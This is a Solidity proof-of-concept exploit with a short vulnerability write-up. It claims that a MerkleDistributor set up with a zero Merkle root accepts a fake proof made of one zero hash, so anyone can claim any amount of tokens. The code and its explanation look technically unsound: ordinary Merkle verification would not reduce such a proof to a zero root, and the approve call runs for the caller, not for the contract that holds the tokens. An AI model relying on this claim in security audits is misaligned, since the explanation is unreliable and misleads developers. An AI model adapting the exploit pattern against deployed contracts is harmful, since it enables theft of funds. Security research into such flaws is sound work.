// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./MerkleDistributor.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MerkleDistributorZeroHashPoC is ERC20 {
    MerkleDistributor public distributor;

    constructor() ERC20("Mock", "MCK") {
        _mint(address(this), 1000000 * 10**18); // 1 million tokens
    }

    function setupVulnerableDistributor() public {
        distributor = new MerkleDistributor(address(this), bytes32(0));
        approve(address(distributor), type(uint256).max);
    }

    function exploitZeroHash(uint256 index, address account, uint256 amount) public {
        bytes32[] memory fakeProof = new bytes32[](1);
        fakeProof[0] = bytes32(0);

        distributor.claim(index, account, amount, fakeProof);
    }

    function checkBalance(address account) public view returns (uint256) {
        return balanceOf(account);
    }
}

/* Vulnerability Explanation:
1. The MerkleDistributor is initialized with a zero Merkle root (bytes32(0)).
2. When the Merkle root is zero, any proof consisting of zero hashes will be considered valid.
3. The exploitZeroHash() function creates a fake proof with a single zero hash.
4. This fake proof bypasses normal verification checks due to the zero Merkle root.
5. As a result, any account can claim any amount of tokens without a valid proof.

Impact: Potential unauthorized distribution of all tokens in the contract.

Recommendation: Implement checks to prevent setting a zero Merkle root and validate 
that proofs do not consist entirely of zero hashes. */
